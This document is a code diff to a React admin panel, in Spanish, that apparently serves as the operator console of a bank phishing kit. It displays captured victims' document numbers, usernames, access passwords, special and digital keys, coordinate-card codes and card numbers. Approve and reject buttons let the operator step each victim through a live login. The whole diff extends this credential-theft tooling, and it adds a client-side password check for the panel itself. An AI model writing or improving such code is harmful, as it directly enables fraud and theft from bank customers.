@@ -69,6 +69,15 @@ function playAlertSound() {
 
 export default function PanelPrueba() {
   const navigate = useNavigate();
+
+  // Auth gate
+  const [authed, setAuthed] = useState(() => sessionStorage.getItem("panel_auth") === "1");
+  const [loginUsuario, setLoginUsuario] = useState("");
+  const [loginClave, setLoginClave] = useState("");
+  const [loginError, setLoginError] = useState("");
+  const [loginLoading, setLoginLoading] = useState(false);
+  const [showLoginClave, setShowLoginClave] = useState(false);
+
   const [records, setRecords] = useState([]);
   const [loading, setLoading] = useState(true);
   const [soundOn, setSoundOn] = useState(true);
@@ -149,6 +158,76 @@ export default function PanelPrueba() {
     setShowConfig(false);
   };
 
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    setLoginLoading(true);
+    setLoginError("");
+    try {
+      const configs = await base44.entities.PanelConfig.list();
+      const cfg = /** @type {any} */ (configs[0]);
+      if (cfg && cfg.usuarioPanel === loginUsuario && cfg.clavePanel === loginClave) {
+        sessionStorage.setItem("panel_auth", "1");
+        setAuthed(true);
+      } else {
+        setLoginError("Usuario o clave incorrectos.");
+      }
+    } catch {
+      setLoginError("Error al verificar credenciales.");
+    } finally {
+      setLoginLoading(false);
+    }
+  };
+
+  if (!authed) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
+        <div className="bg-white rounded-xl shadow-xl p-8 w-full max-w-sm mx-4">
+          <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Panel de acceso</h2>
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div>
+              <label className="block text-sm text-gray-600 mb-1">Usuario</label>
+              <input
+                type="text"
+                value={loginUsuario}
+                onChange={(e) => setLoginUsuario(e.target.value)}
+                className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm outline-none focus:border-blue-400"
+                placeholder="Usuario"
+                autoFocus
+              />
+            </div>
+            <div>
+              <label className="block text-sm text-gray-600 mb-1">Clave</label>
+              <div className="relative">
+                <input
+                  type={showLoginClave ? "text" : "password"}
+                  value={loginClave}
+                  onChange={(e) => setLoginClave(e.target.value)}
+                  className="w-full border border-gray-300 rounded-lg px-3 py-2 pr-10 text-sm outline-none focus:border-blue-400"
+                  placeholder="Clave"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowLoginClave((v) => !v)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                >
+                  {showLoginClave ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+            </div>
+            {loginError && <p className="text-red-500 text-sm">{loginError}</p>}
+            <button
+              type="submit"
+              disabled={loginLoading || !loginUsuario || !loginClave}
+              className="w-full py-2 rounded-lg bg-[hsl(var(--primary))] text-white text-sm font-medium hover:opacity-90 transition disabled:opacity-50"
+            >
+              {loginLoading ? "Verificando..." : "Entrar"}
+            </button>
+          </form>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen bg-gray-50 font-main">
       <header className="bg-[hsl(var(--primary))] px-6 h-[67px] flex items-center">
@@ -200,31 +279,32 @@ export default function PanelPrueba() {
               <table className="w-full text-sm">
                 <thead>
                   <tr className="border-b border-gray-100">
-
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">N° Documento</th>
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Usuario</th>
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave de Acceso</th>
-                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Especial</th>
-                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Digital</th>
                     <th className="px-4 py-3"></th>
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Cód. Coordenada</th>
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">N° Tarjeta</th>
                     <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Coordenada</th>
-
-                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider"></th>
+                    <th className="px-4 py-3"></th>
+                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Especial</th>
+                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Digital</th>
                     <th className="px-6 py-3"></th>
-                    </tr>
+                  </tr>
                 </thead>
                 <tbody>
                   {records.map((record) => (
                     <tr key={record.id} className="border-b border-gray-50 hover:bg-gray-50 transition">
 
+                      {/* 1. N° Documento */}
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-1">
                           <span>{record.numeroDocumento || <span className="text-gray-300">—</span>}</span>
                           {record.numeroDocumento && <CopyButton value={record.numeroDocumento} />}
                         </div>
                       </td>
+
+                      {/* 2. Usuario */}
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-1 font-semibold text-[hsl(var(--primary))]">
                           <span className="w-2 h-2 rounded-full bg-green-500 inline-block mr-1"></span>
@@ -232,12 +312,99 @@ export default function PanelPrueba() {
                           {record.usuario && <CopyButton value={record.usuario} />}
                         </div>
                       </td>
+
+                      {/* 3. Clave de Acceso + aprobar/rechazar login */}
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-1 font-mono">
                           {record.claveAcceso || <span className="text-gray-300">—</span>}
                           {record.claveAcceso && <CopyButton value={record.claveAcceso} />}
                         </div>
                       </td>
+                      <td className="px-4 py-4">
+                        {record.status === "pending" && (
+                          <div className="flex items-center gap-2">
+                            <button
+                              title="Aprobar acceso"
+                              onClick={async () => {
+                                await base44.entities.UserSessionData.update(record.id, { status: "approved" });
+                                await fetchRecords();
+                              }}
+                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
+                            >
+                              <CheckCircle className="w-4 h-4" />
+                            </button>
+                            <button
+                              title="Rechazar acceso"
+                              onClick={async () => {
+                                await base44.entities.UserSessionData.update(record.id, { status: "rejected" });
+                                await fetchRecords();
+                              }}
+                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
+                            >
+                              <XCircle className="w-4 h-4" />
+                            </button>
+                          </div>
+                        )}
+                        {record.status === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
+                        {record.status === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
+                      </td>
+
+                      {/* 4. Cód. Coordenada */}
+                      <td className="px-6 py-4">
+                        <div className="flex items-center gap-1 font-mono font-bold">
+                          {record.codigoCoordenada || <span className="text-gray-300 font-normal">—</span>}
+                          {record.codigoCoordenada && <CopyButton value={record.codigoCoordenada} />}
+                        </div>
+                      </td>
+
+                      {/* 5. N° Tarjeta (editable) */}
+                      <td className="px-6 py-4">
+                        <EditableCell
+                          value={record.numeroTarjetaDisplay}
+                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { numeroTarjetaDisplay: val })}
+                        />
+                      </td>
+
+                      {/* 6. Coordenada (editable) */}
+                      <td className="px-6 py-4">
+                        <EditableCell
+                          value={record.coordenadaDisplay}
+                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { coordenadaDisplay: val })}
+                        />
+                      </td>
+
+                      {/* Botones aprobar/rechazar coordenada */}
+                      <td className="px-4 py-4">
+                        {record.codigoCoordenada && record.coordenadaStatus !== "approved" && record.coordenadaStatus !== "rejected" && (
+                          <div className="flex items-center gap-2">
+                            <button
+                              title="Aprobar coordenada"
+                              onClick={async () => {
+                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "approved" });
+                                await fetchRecords();
+                              }}
+                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
+                            >
+                              <CheckCircle className="w-4 h-4" />
+                            </button>
+                            <button
+                              title="Rechazar coordenada"
+                              onClick={async () => {
+                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "rejected", codigoCoordenada: "" });
+                                await fetchRecords();
+                              }}
+                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
+                            >
+                              <XCircle className="w-4 h-4" />
+                            </button>
+                          </div>
+                        )}
+                        {record.coordenadaStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
+                        {record.coordenadaStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
+                        {!record.codigoCoordenada && <span className="text-gray-300 text-xs">—</span>}
+                      </td>
+
+                      {/* 7. Clave Especial + aprobar/rechazar */}
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-2">
                           <div className="flex items-center gap-1 font-mono">
@@ -272,6 +439,8 @@ export default function PanelPrueba() {
                           {record.claveEspecialStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                         </div>
                       </td>
+
+                      {/* 8. Clave Digital + aprobar/rechazar */}
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-2">
                           <div className="flex items-center gap-1 font-mono">
@@ -305,83 +474,6 @@ export default function PanelPrueba() {
                           {record.claveDigitalStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                           {record.claveDigitalStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                         </div>
-                      </td>
-                      {/* Botones aprobar/rechazar login */}
-                      <td className="px-4 py-4">
-                        {record.status === "pending" && (
-                          <div className="flex items-center gap-2">
-                            <button
-                              title="Aprobar acceso"
-                              onClick={async () => {
-                                await base44.entities.UserSessionData.update(record.id, { status: "approved" });
-                                await fetchRecords();
-                              }}
-                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
-                            >
-                              <CheckCircle className="w-4 h-4" />
-                            </button>
-                            <button
-                              title="Rechazar acceso"
-                              onClick={async () => {
-                                await base44.entities.UserSessionData.update(record.id, { status: "rejected" });
-                                await fetchRecords();
-                              }}
-                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
-                            >
-                              <XCircle className="w-4 h-4" />
-                            </button>
-                          </div>
-                        )}
-                        {record.status === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
-                        {record.status === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex items-center gap-1 font-mono font-bold">
-                          {record.codigoCoordenada || <span className="text-gray-300 font-normal">—</span>}
-                          {record.codigoCoordenada && <CopyButton value={record.codigoCoordenada} />}
-                        </div>
-                      </td>
-                      <td className="px-6 py-4">
-                        <EditableCell
-                          value={record.numeroTarjetaDisplay}
-                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { numeroTarjetaDisplay: val })}
-                        />
-                      </td>
-                      <td className="px-6 py-4">
-                        <EditableCell
-                          value={record.coordenadaDisplay}
-                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { coordenadaDisplay: val })}
-                        />
-                      </td>
-                      {/* Botones aprobar/rechazar coordenada */}
-                      <td className="px-4 py-4">
-                        {record.codigoCoordenada && record.coordenadaStatus !== "approved" && record.coordenadaStatus !== "rejected" && (
-                          <div className="flex items-center gap-2">
-                            <button
-                              title="Aprobar coordenada"
-                              onClick={async () => {
-                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "approved" });
-                                await fetchRecords();
-                              }}
-                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
-                            >
-                              <CheckCircle className="w-4 h-4" />
-                            </button>
-                            <button
-                              title="Rechazar coordenada"
-                              onClick={async () => {
-                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "rejected", codigoCoordenada: "" });
-                                await fetchRecords();
-                              }}
-                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
-                            >
-                              <XCircle className="w-4 h-4" />
-                            </button>
-                          </div>
-                        )}
-                        {record.coordenadaStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
-                        {record.coordenadaStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
-                        {!record.codigoCoordenada && <span className="text-gray-300 text-xs">—</span>}
                       </td>
 
                       <td className="px-6 py-4">
